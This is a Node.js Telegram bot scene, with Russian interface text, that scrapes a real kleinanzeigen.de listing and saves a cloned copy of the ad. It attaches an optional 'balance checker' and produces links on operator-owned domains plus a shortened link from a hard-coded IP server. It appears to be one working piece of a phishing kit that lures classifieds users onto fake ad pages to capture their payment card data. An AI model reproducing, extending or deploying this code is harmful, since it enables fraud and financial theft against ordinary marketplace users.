const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");

const ebaykleinanzeigen_de_domains = ["www.kleinanzeigen.de", "kleinanzeigen.de"];



const scene = new WizardScene(
  "create_link_ebaykleinanzeigen_de",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "ebaykleinanzeigen_de",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, "перешёл к созданию ссылки kleinanzeigen.de");
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Отправьте ссылку на объявление kleinanzeigen.de", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();
      var url;
      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("❌ Введите валидную ссылку").catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (!ebaykleinanzeigen_de_domains.includes(url.host)) {
        await ctx
          .replyOrEdit("❌ Введите ссылку на объявление kleinanzeigen.de")
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }

      log(ctx, `отправил ссылку для парсинга kleinanzeigen.de (${url.href})`);


     await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);


     const ad = await axios.get(encodeURI(url.href), {
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": "https://www.kleinanzeigen.de/",
            "Connection": "keep-alive",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
          },
        });

const $ = cheerio.load(ad.data);


const info = {
  title: null,
  price: null,
  adLink: url.href,
  photo: null,
  alies: null, // 👈 добавлено для количества объявлений
    date1: null, // 👈 сюда попадёт дата
    name: null, // 👈 сюда попадёт дата
      address: null, // 👈 сюда попадёт "97070 Bayern - Würzburg"


};

try {
  // ===== 🏷️ TITLE =====
  const titleElement = $("#viewad-title");
  if (titleElement.length) {
    // Убираем скрытые элементы внутри
    const cleanTitle = titleElement
      .clone() // клонируем
      .children(".pvap-reserved-title") // убираем скрытые метки
      .remove()
      .end()
      .text()
      .trim();
    info.title = cleanTitle;
  }
  // ===== 👤 Имя пользователя (name) =====
const nameElement = $(".userprofile-vip a");
if (nameElement.length) {
  info.name = nameElement.text().trim();
}

// ===== 📍 Адрес объявления =====
const addressElement = $("#viewad-locality");
if (addressElement.length) {
  info.address = addressElement.text().trim();
}

  // ===== 💶 PRICE =====
  const priceElement = $("#viewad-price");
  if (priceElement.length) {
    info.price = priceElement.text().trim();
  }

  // ===== 🖼️ PHOTO =====
  const imgElement = $("#viewad-image");
  if (imgElement.length) {
    info.photo = imgElement.attr("src");
  }

  // ===== 📊 ALIAS COUNT (24 объявления) =====
  const aliasCountElement = $(".bizteaser--preview--more .bizteaser--numads");
  if (aliasCountElement.length) {
    const raw = aliasCountElement.text().trim();
    info.alies = parseInt(raw, 10); // только число
  }
} catch (err) {
  console.error("Ошибка при парсинге данных:", err);
}
try {
  // ... (предыдущий парсинг title, price, photo)

  // ===== 📅 Дата размещения =====
  const dateText = $('#viewad-extra-info i.icon-calendar-gray-simple')
    .next("span")
    .text()
    .trim();

  if (dateText) {
    // Преобразуем в ISO формат (например: 2025-06-29)
    const [day, month, year] = dateText.split(".");
    info.date1 = `${year}-${month}-${day}`;
  }
} catch (err) {
  console.error("Ошибка при парсинге данных:", err);
}


      if (!info.title || !info.price) {
        await ctx.scene
          .reply("❌ Не удалось спарсить объявление")
          .catch((err) => err);
        console.log(info);
        return ctx.scene.leave();
      }
      log(ctx, `спарсил объявление kleinanzeigen.de (${url.href})`);
      ctx.scene.state.data = info;

  
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "ebaykleinanzeigen_de",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }

      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "ebaykleinanzeigen_de",
      });


      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );
      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });

      let reductionUrl;

      try {
        const reduction = await axios.post(
          "http://185.208.158.144/api/create",
          {
            target: `https://${service.domain}/${ad.id}`,
            domain: service.shortlink || ctx.state.bot.shortlink,
          },
          { timeout: 2000 }
        );

        reductionUrl = reduction.data.url;
      } catch (error) {
        console.error("Ошибка при создании сокращенной ссылки:", error.message);

        if (error.code === 'ECONNABORTED') {
          console.warn("Запрос превысил допустимый тайм-аут.");
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
          console.warn("Сервер сокращений недоступен.");
        } else {
          console.warn("Произошла непредвиденная ошибка:", error.message);
        }

        reductionUrl = null; // корректный fallback 
      }

      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reductionUrl, // используем переменную 
      });

      log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`);

      // Собираем сообщение 
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => { });
      }
      ctx.updateType = "message";
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

module.exports = scene;
